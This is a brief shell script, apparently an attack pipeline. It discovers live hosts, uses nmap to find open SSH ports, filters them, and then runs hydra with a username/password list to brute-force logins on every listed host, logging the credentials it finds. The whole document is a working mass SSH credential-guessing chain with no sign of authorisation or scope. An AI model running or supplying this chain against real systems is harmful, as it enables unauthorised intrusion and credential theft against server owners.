bash ipScan.sh #output to lib/liveIps
python ipCleanup.py #output to lib/ips
nmap -iL lib/ips -p22 -oN lib/sshOpen -Pn
python portCleanup.py > lib/ipOpen

hydra -C usr/userpass.lst -M lib/ipOpen -o log/found -t 1 ssh
